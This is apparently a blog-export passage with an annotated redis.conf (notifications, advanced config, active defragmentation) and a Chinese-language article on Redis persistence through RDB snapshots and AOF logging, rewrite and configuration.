############################# EVENT NOTIFICATION ############################### Redis可以通知Pub/Sub客户端在key space中发生的事件。该特性在https://redis.io/topics/notifications上有文档说明# 例如，如果“notify-keyspace-events”通知被启用，并且客户端对存储在数据库0中的KEY“foo”执行DEL操作，则两条消息将通过Pub/Sub发布:## PUBLISH __keyspace@0__:foo del# PUBLISH __keyevent@0__:del foo## 可以选择Redis将在一组类中通知的事件。每个类别都由一个单一的字符来标识:##  K     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.#  E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...#  $     String commands#  l     List commands#  s     Set commands#  h     Hash commands#  z     Sorted set commands#  x     Expired events (events generated every time a key expires)#  e     Evicted events (events generated when a key is evicted for maxmemory)#  n     New key events (Note: not included in the 'A' class)#  t     Stream commands#  d     Module key type events#  m     Key-miss events (Note: It is not included in the 'A' class)#  A     Alias for g$lshzxetd, so that the "AKE" string means all the events#        (Except key-miss events which are excluded from 'A' due to their#         unique nature).# #  “notify-keyspace-events” 以一个由零个或多个字符组成的字符串作为参数。空字符串表示禁用通知。#  示例1:要启用列表和通用事件，从事件名称的角度来看，使用: notify-keyspace-events Elg#  示例2: 获取订阅通道名的过期KEY的流 __keyevent@0__:expired 使用: notify-keyspace-events Ex## 默认情况下，所有通知都是禁用的，因为大多数用户不需要这个功能，而且这个功能有一些开销。注意，如果不指定K或E中的至少一个，则不会传递任何事件。notify-keyspace-events ""
ADVANCED CONFIG
############################### ADVANCED CONFIG ################################ 当哈希表有少量条目且最大条目不超过给定阈值时，使用内存效率高的数据结构进行编码。# 可以使用以下指令配置这些阈值。hash-max-listpack-entries 512hash-max-listpack-value 64# 列表还以一种特殊的方式进行编码，以节省大量空间。# 每个内部列表节点允许的条目数可以指定为固定的最大大小或最大元素数。# 对于固定的最大大小，使用-5到-1，这意味着:# -5: max size: 64 Kb  &lt;-- not recommended for normal workloads# -4: max size: 32 Kb  &lt;-- not recommended# -3: max size: 16 Kb  &lt;-- probably not recommended# -2: max size: 8 Kb   &lt;-- good# -1: max size: 4 Kb   &lt;-- good# 正数意味着每个列表节点存储的元素数量不超过这个数字# 最高性能选项通常是-2 (8 Kb大小)或-1 (4 Kb大小)，但如果您的用例是唯一的，请根据需要调整设置。list-max-listpack-size -2# 列表也可以被压缩。# 压缩深度是从列表的两边排除压缩的quicklist ziplist节点的数量。# 列表的头部和尾部总是未压缩，以便进行快速的推送/弹出操作。设置:# 0: 禁用所有列表压缩# 1: depth 1 means "don't start compressing until after 1 node into the list,#    going from either the head or tail"#    So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail]#    [head], [tail] will always be uncompressed; inner nodes will compress.# 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail]#    2 here means: don't compress head or head-&gt;next or tail-&gt;prev or tail,#    but compress all nodes between them.# 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail]# etc.list-compress-depth 0# 当一个集合只是由基数为10的64位有符号整数范围内的整数组成时，集合具有特殊的编码。# 下面的配置设置设置了集合大小的限制，以便使用这种特殊的内存节省编码。set-max-intset-entries 512# 包含非整数值的集合，当它们有少量的条目，并且最大的条目不超过给定的阈值时，也使用内存有效的数据结构进行编码。 # 可以使用以下指令配置这些阈值。set-max-listpack-entries 128set-max-listpack-value 64# 与哈希和列表类似，排序集也经过特殊编码，以节省大量空间。此编码仅在排序集的长度和元素低于以下限制时使用:zset-max-listpack-entries 128zset-max-listpack-value 64# HyperLogLog稀疏表示字节限制。限制包括16字节的报头。当使用稀疏表示的HyperLogLog超过该限制时，将被转换为密集表示。# 大于16000的值是完全无用的，因为此时密集表示的内存效率更高。# 建议值为~ 3000，以获得空间高效编码的好处，而不会降低太多PFADD的速度，使用稀疏编码时PFADD为O(N)。# 当不考虑CPU，但考虑空间，并且数据集由基数在0-15000范围内的许多hyperloglog组成时，该值可以提高到~10000。hll-sparse-max-bytes 3000# Streams macro node max size / items.# 流数据结构是一个大节点的基树，其中编码多个项。使用此配置，可以配置单个节点的字节大小，以及在添加新流条目时切换到新节点之前可以包含的最大项数。# 如果下列任何设置被设置为0，则该限制将被忽略，因此，例如，可以通过将max-bytes设置为0并将max-entries设置为所需值来设置max-entries限制。stream-node-max-bytes 4096stream-node-max-entries 100# 主动rehash每100毫秒使用1毫秒的CPU时间来帮助重哈希主Redis哈希表(将顶级键映射到值的哈希表)。# Redis使用的哈希表实现(参见dicc .c)执行惰性重哈希:你对哈希表执行的操作越多，执行的重哈希“步骤”就越多，所以如果服务器空闲，重哈希永远不会完成，哈希表会占用更多内存。## 默认情况下，每秒钟使用这个毫秒10次，以便主动重新散列主字典，尽可能释放内存。# 如果不确定:使用“activerehashing no”，如果你有硬延迟要求，在你的环境中，Redis可以不时地以2毫秒的延迟回复查询，这不是一件好事。# 如果你没有这样的硬性要求，但想尽快释放内存，请使用"activerehashing yes"。activerehashing yes# 客户端输出缓冲区限制可用于强制断开由于某些原因(常见原因是Pub/Sub客户端消费消息的速度不及发布者生成消息的速度)而未能足够快地从服务器读取数据的客户端。# 可以为三种不同类型的客户端设置不同的限制:## normal -&gt; normal clients including MONITOR clients# replica -&gt; replica clients# pubsub -&gt; clients subscribed to at least one pubsub channel or pattern## The syntax of every client-output-buffer-limit directive is the following:## client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;## A client is immediately disconnected once the hard limit is reached, or if# the soft limit is reached and remains reached for the specified number of# seconds (continuously).# So for instance if the hard limit is 32 megabytes and the soft limit is# 16 megabytes / 10 seconds, the client will get disconnected immediately# if the size of the output buffers reach 32 megabytes, but will also get# disconnected if the client reaches 16 megabytes and continuously overcomes# the limit for 10 seconds.## By default normal clients are not limited because they don't receive data# without asking (in a push way), but just after a request, so only# asynchronous clients may create a scenario where data is requested faster# than it can read.## Instead there is a default limit for pubsub and replica clients, since# subscribers and replicas receive data in a push fashion.## Note that it doesn't make sense to set the replica clients output buffer# limit lower than the repl-backlog-size config (partial sync will succeed# and then replica will get disconnected).# Such a configuration is ignored (the size of repl-backlog-size will be used).# This doesn't have memory consumption implications since the replica client# will share the backlog buffers memory.## Both the hard or the soft limit can be disabled by setting them to zero.client-output-buffer-limit normal 0 0 0client-output-buffer-limit replica 256mb 64mb 60client-output-buffer-limit pubsub 32mb 8mb 60# Client query buffers accumulate new commands. They are limited to a fixed# amount by default in order to avoid that a protocol desynchronization (for# instance due to a bug in the client) will lead to unbound memory usage in# the query buffer. However you can configure it here if you have very special# needs, such us huge multi/exec requests or alike.## client-query-buffer-limit 1gb# In some scenarios client connections can hog up memory leading to OOM# errors or data eviction. To avoid this we can cap the accumulated memory# used by all client connections (all pubsub and normal clients). Once we# reach that limit connections will be dropped by the server freeing up# memory. The server will attempt to drop the connections using the most # memory first. We call this mechanism "client eviction".## Client eviction is configured using the maxmemory-clients setting as follows:# 0 - client eviction is disabled (default)## A memory value can be used for the client eviction threshold,# for example:# maxmemory-clients 1g## A percentage value (between 1% and 100%) means the client eviction threshold# is based on a percentage of the maxmemory setting. For example to set client# eviction at 5% of maxmemory:# maxmemory-clients 5%# In the Redis protocol, bulk requests, that are, elements representing single# strings, are normally limited to 512 mb. However you can change this limit# here, but must be 1mb or greater## proto-max-bulk-len 512mb# Redis calls an internal function to perform many background tasks, like# closing connections of clients in timeout, purging expired keys that are# never requested, and so forth.## Not all tasks are performed with the same frequency, but Redis checks for# tasks to perform according to the specified "hz" value.## By default "hz" is set to 10. Raising the value will use more CPU when# Redis is idle, but at the same time will make Redis more responsive when# there are many keys expiring at the same time, and timeouts may be# handled with more precision.## The range is between 1 and 500, however a value over 100 is usually not# a good idea. Most users should use the default of 10 and raise this up to# 100 only in environments where very low latency is required.hz 10# Normally it is useful to have an HZ value which is proportional to the# number of clients connected. This is useful in order, for instance, to# avoid too many clients are processed for each background task invocation# in order to avoid latency spikes.## Since the default HZ value by default is conservatively set to 10, Redis# offers, and enables by default, the ability to use an adaptive HZ value# which will temporarily raise when there are many connected clients.## When dynamic HZ is enabled, the actual configured HZ will be used# as a baseline, but multiples of the configured HZ value will be actually# used as needed once more clients are connected. In this way an idle# instance will use very little CPU time while a busy instance will be# more responsive.dynamic-hz yes# When a child rewrites the AOF file, if the following option is enabled# the file will be fsync-ed every 4 MB of data generated. This is useful# in order to commit the file to the disk more incrementally and avoid# big latency spikes.aof-rewrite-incremental-fsync yes# When redis saves RDB file, if the following option is enabled# the file will be fsync-ed every 4 MB of data generated. This is useful# in order to commit the file to the disk more incrementally and avoid# big latency spikes.rdb-save-incremental-fsync yes# Redis LFU eviction (see maxmemory setting) can be tuned. However it is a good# idea to start with the default settings and only change them after investigating# how to improve the performances and how the keys LFU change over time, which# is possible to inspect via the OBJECT FREQ command.## There are two tunable parameters in the Redis LFU implementation: the# counter logarithm factor and the counter decay time. It is important to# understand what the two parameters mean before changing them.## The LFU counter is just 8 bits per key, it's maximum value is 255, so Redis# uses a probabilistic increment with logarithmic behavior. Given the value# of the old counter, when a key is accessed, the counter is incremented in# this way:## 1. A random number R between 0 and 1 is extracted.# 2. A probability P is calculated as 1/(old_value*lfu_log_factor+1).# 3. The counter is incremented only if R &lt; P.## The default lfu-log-factor is 10. This is a table of how the frequency# counter changes with a different number of accesses with different# logarithmic factors:## +--------+------------+------------+------------+------------+------------+# | factor | 100 hits   | 1000 hits  | 100K hits  | 1M hits    | 10M hits   |# +--------+------------+------------+------------+------------+------------+# | 0      | 104        | 255        | 255        | 255        | 255        |# +--------+------------+------------+------------+------------+------------+# | 1      | 18         | 49         | 255        | 255        | 255        |# +--------+------------+------------+------------+------------+------------+# | 10     | 10         | 18         | 142        | 255        | 255        |# +--------+------------+------------+------------+------------+------------+# | 100    | 8          | 11         | 49         | 143        | 255        |# +--------+------------+------------+------------+------------+------------+## NOTE: The above table was obtained by running the following commands:##   redis-benchmark -n 1000000 incr foo#   redis-cli object freq foo## NOTE 2: The counter initial value is 5 in order to give new objects a chance# to accumulate hits.## The counter decay time is the time, in minutes, that must elapse in order# for the key counter to be decremented.## The default value for the lfu-decay-time is 1. A special value of 0 means we# will never decay the counter.## lfu-log-factor 10# lfu-decay-time 1
ACTIVE DEFRAGMENTATION
########################### ACTIVE DEFRAGMENTATION #######################
#
# What is active defragmentation?
# -------------------------------
#
# Active (online) defragmentation allows a Redis server to compact the
# spaces left between small allocations and deallocations of data in memory,
# thus allowing to reclaim back memory.
#
# Fragmentation is a natural process that happens with every allocator (but
# less so with Jemalloc, fortunately) and certain workloads. Normally a server
# restart is needed in order to lower the fragmentation, or at least to flush
# away all the data and create it again. However thanks to this feature
# implemented by Oran Agra for Redis 4.0 this process can happen at runtime
# in a "hot" way, while the server is running.
#
# Basically when the fragmentation is over a certain level (see the
# configuration options below) Redis will start to create new copies of the
# values in contiguous memory regions by exploiting certain specific Jemalloc
# features (in order to understand if an allocation is causing fragmentation
# and to allocate it in a better place), and at the same time, will release the
# old copies of the data. This process, repeated incrementally for all the keys
# will cause the fragmentation to drop back to normal values.
#
# Important things to understand:
#
# 1. This feature is disabled by default, and only works if you compiled Redis
#    to use the copy of Jemalloc we ship with the source code of Redis.
#    This is the default with Linux builds.
#
# 2. You never need to enable this feature if you don't have fragmentation
#    issues.
#
# 3. Once you experience fragmentation, you can enable this feature when
#    needed with the command "CONFIG SET activedefrag yes".
#
# The configuration parameters are able to fine tune the behavior of the
# defragmentation process. If you are not sure about what they mean it is
# a good idea to leave the defaults untouched.

# Active defragmentation is disabled by default
# activedefrag no

# Minimum amount of fragmentation waste to start active defrag
# active-defrag-ignore-bytes 100mb

# Minimum percentage of fragmentation to start active defrag
# active-defrag-threshold-lower 10

# Maximum percentage of fragmentation at which we use maximum effort
# active-defrag-threshold-upper 100

# Minimal effort for defrag in CPU percentage, to be used when the lower
# threshold is reached
# active-defrag-cycle-min 1

# Maximal effort for defrag in CPU percentage, to be used when the upper
# threshold is reached
# active-defrag-cycle-max 25

# Maximum number of set/hash/zset/list fields that will be processed from
# the main dictionary scan
# active-defrag-max-scan-fields 1000

# Jemalloc background thread for purging will be enabled by default
jemalloc-bg-thread yes

# It is possible to pin different threads and processes of Redis to specific
# CPUs in your system, in order to maximize the performances of the server.
# This is useful both in order to pin different Redis threads in different
# CPUs, but also in order to make sure that multiple Redis instances running
# in the same host will be pinned to different CPUs.
#
# Normally you can do this using the "taskset" command, however it is also
# possible to this via Redis configuration directly, both in Linux and FreeBSD.
#
# You can pin the server/IO threads, bio threads, aof rewrite child process, and
# the bgsave child process. The syntax to specify the cpu list is the same as
# the taskset command:
#
# Set redis server/io threads to cpu affinity 0,2,4,6:
# server_cpulist 0-7:2
#
# Set bio threads to cpu affinity 1,3:
# bio_cpulist 1,3
#
# Set aof rewrite child process to cpu affinity 8,9,10,11:
# aof_rewrite_cpulist 8-11
#
# Set bgsave child process to cpu affinity 1,10,11
# bgsave_cpulist 1,10-11

# In some cases redis will emit warnings and even refuse to start if it detects
# that the system is in bad state, it is possible to suppress these warnings
# by setting the following config which takes a space delimited list of warnings
# to suppress
#
# ignore-warnings ARM64-COW-BUG

]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-持久化</title>
    <url>/20221102/574fe2f4.html</url>
    <content><![CDATA[

为什么需要持久化？
Redis是个基于内存的数据库。那服务一旦宕机，内存中的数据将全部丢失。通常的解决方案是从后端数据库恢复这些数据，但后端数据库有性能瓶颈，如果是大数据量的恢复  1、会对数据库带来巨大的压力，2、数据库的性能不如Redis。导致程序响应慢。所以对Redis来说，实现数据的持久化，避免从后端数据库中恢复数据，是至关重要的。


Redis持久化有哪些方式呢？
从严格意义上说，Redis服务提供四种持久化存储方案：RDB、AOF、虚拟内存（VM）和　DISKSTORE。
虚拟内存（VM）方式，从Redis Version 2.4开始就被官方明确表示不再建议使用，Version 3.2版本中更找不到关于虚拟内存（VM）的任何配置范例.Redis的主要作者Salvatore Sanfilippo还专门写了一篇论文，来反思Redis对虚拟内存（VM）存储技术的支持问题。
DISKSTORE方式，是从Redis Version 2.8版本开始提出的一个存储设想，到目前为止Redis官方也没有在任何stable版本中明确建议使用这用方式。在Version 3.2版本中同样找不到对于这种存储方式的明确支持


为什么我们需要重点学RDB和AOF？
目前官方文档上能够看到的Redis对持久化存储的支持明确的就只有两种方案（https://redis.io/topics/persistence）：RDB和AOF


RDB

RDB 就是 Redis DataBase 的缩写，中文名为快照/内存快照，RDB持久化是把当前进程数据生成快照保存到磁盘上的过程，由于是某一时刻的快照，那么快照中的值要早于或者等于内存中的值

触发方式

触发rdb持久化的方式有2种，分别是手动触发和自动触发。

手动触发

手动触发分别对应save和bgsave命令，会在data文件夹下生成dump.rdb文件



save命令：阻塞当前Redis服务器，直到RDB过程完成为止，对于内存 比较大的实例会造成长时间阻塞，线上环境不建议使用


bgsave命令：Redis进程执行fork操作，创建子进程，RDB持久化过程由子进程负责，完成后自动结束。阻塞只发生在fork阶段，一般时间很短。具体流程如下：




redis客户端执行bgsave命令或者自动触发bgsave命令；


主进程判断当前是否已经存在正在执行的子进程，如果存在，那么主进程直接返回；


如果不存在正在执行的子进程，那么就fork一个新的子进程进行持久化数据，fork过程是阻塞的，fork操作完成后主进程即可执行其他操作；


子进程先将数据写入到临时的rdb文件中，待快照数据写入完成后再原子替换旧的rdb文件；


同时发送信号给主进程，通知主进程rdb持久化完成，主进程更新相关的统计信息（info persitence下的rdb_*相关选项）。



自动触发
在以下4种情况时会自动触发


redis.conf中配置save m n，即在m秒内有n次修改时，自动触发bgsave生成rdb文件；


主从复制时，从节点要从主节点进行全量复制时也会触发bgsave操作，生成当时的快照发送到从节点；


执行debug reload命令重新加载redis时也会触发bgsave操作；


默认情况下执行shutdown命令时，如果没有开启aof持久化，那么也会触发bgsave操作


redis.conf配置RDB
快照周期：内存快照虽然可以通过技术人员手动执行SAVE或BGSAVE命令来进行，但生产环境下多数情况都会设置其周期性执行条件。


Redis中默认的周期新设置
# 周期性执行条件的设置格式为save &lt;seconds&gt; &lt;changes&gt;# 默认的设置为：save 900 1  # 如果900秒内有1条Key信息发生变化，则进行快照save 300 10 # 如果300秒内有10条Key信息发生变化，则进行快照；save 60 10000 # 如果60秒内有10000条Key信息发生变化，则进行快照；# 以下设置方式为关闭RDB快照功能save ""


其它相关配置
# 文件名称dbfilename dump.rdb# 文件保存路径dir /home/work/app/redis/data/# 如果持久化出错，主进程是否停止写入stop-writes-on-bgsave-error yes# 是否压缩rdbcompression yes# 导入时是否检查rdbchecksum yes


dbfilename：RDB文件在磁盘上的名称。


dir：RDB文件的存储路径。默认设置为“./”，也就是Redis服务的主目录。


stop-writes-on-bgsave-error：上文提到的在快照进行过程中，主进程照样可以接受客户端的任何写操作的特性，是指在快照操作正常的情况下。如果快照操作出现异常（例如操作系统用户权限不够、磁盘空间写满等等）时，Redis就会禁止写操作。这个特性的主要目的是使运维人员在第一时间就发现Redis的运行错误，并进行解决。一些特定的场景下，您可能需要对这个特性进行配置，这时就可以调整这个参数项。该参数项默认情况下值为yes，如果要关闭这个特性，指定即使出现快照错误Redis一样允许写操作，则可以将该值更改为no。


rdbcompression：该属性将在字符串类型的数据被快照到磁盘文件时，启用LZF压缩算法。Redis官方的建议是请保持该选项设置为yes，因为“it’s almost always a win”。


rdbchecksum：从RDB快照功能的version 5 版本开始，一个64位的CRC冗余校验编码会被放置在RDB文件的末尾，以便对整个RDB文件的完整性进行验证。这个功能大概会多损失10%左右的性能，但获得了更高的数据可靠性。所以如果您的Redis服务需要追求极致的性能，就可以将这个选项设置为no。


RDB 更深入理解

由于生产环境中我们为Redis开辟的内存区域都比较大（例如6GB），那么将内存中的数据同步到硬盘的过程可能就会持续比较长的时间，而实际情况是这段时间Redis服务一般都会收到数据写操作请求。那么如何保证数据一致性呢

​		RDB中的核心思路是Copy-on-Write，来保证在进行快照操作的这段时间，需要压缩写入磁盘上的数据在内存中不会发生变化。在正常的快照操作中，一方面Redis主进程会fork一个新的快照进程专门来做这个事情，这样保证了Redis服务不会停止对客户端包括写请求在内的任何响应。另一方面这段时间发生的数据变化会以副本的方式存放在另一个新的内存区域，待快照操作结束后才会同步到原来的内存区域。
​		举个例子：如果主线程对这些数据也都是读操作（例如图中的键值对 A），那么，主线程和 bgsave 子进程相互不影响。但是，如果主线程要修改一块数据（例如图中的键值对 C），那么，这块数据就会被复制一份，生成该数据的副本。然后，bgsave 子进程会把这个副本数据写入 RDB 文件，而在这个过程中，主线程仍然可以直接修改原来的数据



在进行快照操作的这段时间，如果发生服务崩溃怎么办？
很简单，在没有将数据全部写入到磁盘前，这次快照操作都不算成功。如果出现了服务崩溃的情况，将以上一次完整的RDB快照文件作为恢复内存数据的参考。也就是说，在快照操作过程中不能影响上一次的备份数据。Redis服务会在磁盘上创建一个临时文件进行数据操作，待操作成功后才会用这个临时文件替换掉上一次的备份。


可以每秒做一次快照吗？
对于快照来说，所谓“连拍”就是指连续地做快照。这样一来，快照的间隔时间变得很短，即使某一时刻发生宕机了，因为上一时刻快照刚执行，丢失的数据也不会太多。但是，这其中的快照间隔时间就很关键了。
如下图所示，我们先在 T0 时刻做了一次快照，然后又在 T0+t 时刻做了一次快照，在这期间，数据块 5 和 9 被修改了。如果在 t 这段时间内，机器宕机了，那么，只能按照 T0 时刻的快照进行恢复。此时，数据块 5 和 9 的修改值因为没有快照记录，就无法恢复了。





所以，要想尽可能恢复数据，t 值就要尽可能小，t 越小，就越像“连拍”。那么，t 值可以小到什么程度呢，比如说是不是可以每秒做一次快照？毕竟，每次快照都是由 bgsave 子进程在后台执行，也不会阻塞主线程。这种想法其实是错误的。虽然 bgsave 执行时不阻塞主线程，但是，如果频繁地执行全量快照，也会带来两方面的开销：

一方面，频繁将全量数据写入磁盘，会给磁盘带来很大压力，多个快照竞争有限的磁盘带宽，前一个快照还没有做完，后一个又开始做了，容易造成恶性循环。
另一方面，bgsave 子进程需要通过 fork 操作从主线程创建出来。虽然，子进程在创建后不会再阻塞主线程，但是，fork 这个创建过程本身会阻塞主线程，而且主线程的内存越大，阻塞时间越长。如果频繁 fork 出 bgsave 子进程，这就会频繁阻塞主线程了。

那么，有什么其他好方法吗？此时，我们可以做增量快照，就是指做了一次全量快照后，后续的快照只对修改的数据进行快照记录，这样可以避免每次全量快照的开销。这个比较好理解。
但是它需要我们使用额外的元数据信息去记录哪些数据被修改了，这会带来额外的空间开销问题。那么，还有什么方法既能利用 RDB 的快速恢复，又能以较小的开销做到尽量少丢数据呢？且看后文中4.0版本中引入的RDB和AOF的混合方式。
RDB优缺点

优点

RDB文件是某个时间节点的快照，默认使用LZF算法进行压缩，压缩后的文件体积远远小于内存大小，适用于备份、全量复制等场景；
Redis加载RDB文件恢复数据要远远快于AOF方式；


缺点

RDB方式实时性不够，无法做到秒级的持久化；
每次调用bgsave都需要fork子进程，fork子进程属于重量级操作，频繁执行成本较高；
RDB文件是二进制的，没有可读性，AOF文件在了解其结构的情况下可以手动修改或者补全；
版本兼容RDB文件问题；



针对RDB不适合实时持久化的问题，Redis提供了AOF持久化方式来解决
AOF

Redis是“写后”日志，Redis先执行命令，把数据写入内存，然后才记录日志。
日志里记录的是Redis收到的每一条命令，这些命令是以文本形式保存。PS: 大多数的数据库采用的是写前日志（WAL），例如MySQL，通过写前日志和两阶段提交，实现数据和逻辑的一致性。

而AOF日志采用写后日志，即先写内存，后写日志。

为什么采用写后日志？
Redis要求高性能，采用写日志有两方面好处：

避免额外的检查开销：Redis 在向 AOF 里面记录日志的时候，并不会先去对这些命令进行语法检查。所以，如果先记日志再执行命令的话，日志中就有可能记录了错误的命令，Redis 在使用日志恢复数据时，就可能会出错。
不会阻塞当前的写操作，

但这种方式存在潜在风险：

如果命令执行完成，写日志之前宕机了，会丢失数据。
主线程写磁盘压力大，导致写盘慢，阻塞后续操作。

如何实现AOF
AOF日志记录Redis的每个写命令，步骤分为：命令追加（append）、文件写入（write）和 文件同步（sync）。


命令追加 当AOF持久化功能打开了，服务器在执行完一个写命令之后，会以协议格式将被执行的写命令追加到服务器的aof_buf缓冲区。


文件写入和同步 关于何时将 aof_buf 缓冲区的内容写入AOF文件中，Redis提供了三种写回策略
Always，同步写回：每个写命令执行完，立马同步地将日志写回磁盘；
Everysec，每秒写回：每个写命令执行完，只是先把日志写到AOF文件的内存缓冲区，每隔一秒把缓冲区中的内容写入磁盘；
No，操作系统控制的写回：每个写命令执行完，只是先把日志写到AOF文件的内存缓冲区，由操作系统决定何时将缓冲区内容写回磁盘。


三种写回策略的优缺点
上面的三种写回策略体现了一个重要原则：trade-off，取舍，指在性能和可靠性保证之间做取舍。
关于AOF的同步策略是涉及到操作系统的 write 函数和 fsync 函数的，在《Redis设计与实现》中是这样说明的：
为了提高文件写入效率，在现代操作系统中，当用户调用write函数，将一些数据写入文件时，操作系统通常会将数据暂存到一个内存缓冲区里，当缓冲区的空间被填满或超过了指定时限后，才真正将缓冲区的数据写入到磁盘里。这样的操作虽然提高了效率，但也为数据写入带来了安全问题：如果计算机停机，内存缓冲区中的数据会丢失。为此，系统提供了fsync、fdatasync同步函数，可以强制操作系统立刻将缓冲区中的数据写入到硬盘里，从而确保写入数据的安全性。


redis.conf中配置AOF
默认情况下，Redis是没有开启AOF的，可以通过配置redis.conf文件来开启AOF持久化，关于AOF的配置如下：
# appendonly参数开启AOF持久化appendonly no# AOF持久化的文件名，默认是appendonly.aofappendfilename "appendonly.aof"# AOF文件的保存位置和RDB文件的位置相同，都是通过dir参数设置的dir ./# 同步策略# appendfsync alwaysappendfsync everysec# appendfsync no# aof重写期间是否同步no-appendfsync-on-rewrite no# 重写触发配置auto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mb# 加载aof出错如何处理aof-load-truncated yes# 文件重写策略aof-rewrite-incremental-fsync yes


appendonly：默认情况下AOF功能是关闭的，将该选项改为yes以便打开Redis的AOF功能。


appendfilename：这个参数项很好理解了，就是AOF文件的名字。


appendfsync：这个参数项是AOF功能最重要的设置项之一，主要用于设置“真正执行”操作命令向AOF文件中同步的策略
什么叫“真正执行”呢？还记得Linux操作系统对磁盘设备的操作方式吗？ 为了保证操作系统中I/O队列的操作效率，应用程序提交的I/O操作请求一般是被放置在linux Page Cache中的，然后再由Linux操作系统中的策略自行决定正在写到磁盘上的时机。而Redis中有一个fsync()函数，可以将Page Cache中待写的数据真正写入到物理设备上，而缺点是频繁调用这个fsync()函数干预操作系统的既定策略，可能导致I/O卡顿的现象频繁 。
与上节对应，appendfsync参数项可以设置三个值，分别是：always、everysec、no，默认的值为everysec。


no-appendfsync-on-rewrite：always和everysec的设置会使真正的I/O操作高频度的出现，甚至会出现长时间的卡顿情况，这个问题出现在操作系统层面上，所有靠工作在操作系统之上的Redis是没法解决的。为了尽量缓解这个情况，Redis提供了这个设置项，保证在完成fsync函数调用时，不会将这段时间内发生的命令操作放入操作系统的Page Cache（这段时间Redis还在接受客户端的各种写操作命令）。


auto-aof-rewrite-percentage：上文说到在生产环境下，技术人员不可能随时随地使用“BGREWRITEAOF”命令去重写AOF文件。所以更多时候我们需要依靠Redis中对AOF文件的自动重写策略。Redis中对触发自动重写AOF文件的操作提供了两个设置：auto-aof-rewrite-percentage表示如果当前AOF文件的大小超过了上次重写后AOF文件的百分之多少后，就再次开始重写AOF文件。例如该参数值的默认设置值为100，意思就是如果AOF文件的大小超过上次AOF文件重写后的1倍，就启动重写操作。


auto-aof-rewrite-min-size：参考auto-aof-rewrite-percentage选项的介绍，auto-aof-rewrite-min-size设置项表示启动AOF文件重写操作的AOF文件最小大小。如果AOF文件大小低于这个值，则不会触发重写操作。注意，auto-aof-rewrite-percentage和auto-aof-rewrite-min-size只是用来控制Redis中自动对AOF文件进行重写的情况，如果是技术人员手动调用“BGREWRITEAOF”命令，则不受这两个限制条件左右。


深入理解AOF重写

AOF会记录每个写命令到AOF文件，随着时间越来越长，AOF文件会变得越来越大。如果不加以控制，会对Redis服务器，甚至对操作系统造成影响，而且AOF文件越大，数据恢复也越慢。为了解决AOF文件体积膨胀的问题，Redis提供AOF文件重写机制来对AOF文件进行“瘦身”。


图例解释AOF重写

Redis通过创建一个新的AOF文件来替换现有的AOF，新旧两个AOF文件保存的数据相同，但新AOF文件没有了冗余命令。



AOF重写会阻塞吗？
AOF重写过程是由后台进程bgrewriteaof来完成的。主线程fork出后台的bgrewriteaof子进程，fork会把主线程的内存拷贝一份给bgrewriteaof子进程，这里面就包含了数据库的最新数据。然后，bgrewriteaof子进程就可以在不影响主线程的情况下，逐一把拷贝的数据写成操作，记入重写日志。
所以aof在重写时，在fork进程时是会阻塞住主线程的。


AOF日志何时会重写？
有两个配置项控制AOF重写的触发：
auto-aof-rewrite-min-size:表示运行AOF重写时文件的最小大小，默认为64MB。
auto-aof-rewrite-percentage: 这个值的计算方式是，当前aof文件大小和上一次重写后aof文件大小的差值，再除以上一次重写后aof文件大小。也就是当前aof文件比上一次重写后aof文件的增量大小，和上一次重写后aof文件大小的比值。


重写日志时，有新数据写入咋整？
重写过程总结为：“一个拷贝，两处日志”。在fork出子进程时的拷贝，以及在重写时，如果有新数据写入，主线程就会将命令记录到两个aof日志内存缓冲区中。如果AOF写回策略配置的是always，则直接将命令写回旧的日志文件，并且保存一份命令至AOF重写缓冲区，这些操作对新的日志文件是不存在影响的。（旧的日志文件：主线程使用的日志文件，新的日志文件：bgrewriteaof进程使用的日志文件）
而在bgrewriteaof子进程完成会日志文件的重写操作后，会提示主线程已经完成重写操作，主线程会将AOF重写缓冲中的命令追加到新的日志文件后面。这时候在高并发的情况下，AOF重写缓冲区积累可能会很大，这样就会造成阻塞，Redis后来通过Linux管道技术让aof重写期间就能同时进行回放，这样aof重写结束后只需回放少量剩余的数据即可。
最后通过修改文件名的方式，保证文件切换的原子性。
在AOF重写日志期间发生宕机的话，因为日志文件还没切换，所以恢复数据时，用的还是旧的日志文件。


总结操作：

主线程fork出子进程重写aof日志
子进程重写日志完成后，主线程追加aof日志缓冲
替换日志文件


这里的进程和线程的概念有点混乱。因为后台的bgreweiteaof进程就只有一个线程在操作，而主线程是Redis的操作进程，也是单独一个线程。这里想表达的是Redis主进程在fork出一个后台进程之后，后台进程的操作和主进程是没有任何关联的，也不会阻塞主线程。




主线程fork出子进程的是如何复制内存数据的？
fork采用操作系统提供的写时复制（copy on write）机制，就是为了避免一次性拷贝大量内存数据给子进程造成阻塞。fork子进程时，子进程时会拷贝父进程的页表，即虚实映射关系（虚拟内存和物理内存的映射索引表），而不会拷贝物理内存。这个拷贝会消耗大量cpu资源，并且拷贝完成前会阻塞主线程，阻塞时间取决于内存中的数据量，数据量越大，则内存页表越大。拷贝完成后，父子进程使用相同的内存地址空间。
但主进程是可以有数据写入的，这时候就会拷贝物理内存中的数据。如下图（进程1看做是主进程，进程2看做是子进程）：
​	
在主进程有数据写入时，而这个数据刚好在页c中，操作系统会创建这个页面的副本（页c的副本)，即拷贝当前页的物理数据，将其映射到主进程中，而子进程还是使用原来的的页c。


在重写日志整个过程时，主线程有哪些地方会被阻塞？

fork子进程时，需要拷贝虚拟页表，会对主线程阻塞。
主进程有bigkey写入时，操作系统会创建页面的副本，并拷贝原有的数据，会对主线程阻塞。
子进程重写日志完成后，主进程追加aof重写缓冲区时可能会对主线程阻塞。



为什么AOF重写不复用原AOF日志？
两方面原因：

父子进程写同一个文件会产生竞争问题，影响父进程的性能。
如果AOF重写过程中失败了，相当于污染了原本的AOF文件，无法做恢复数据使用



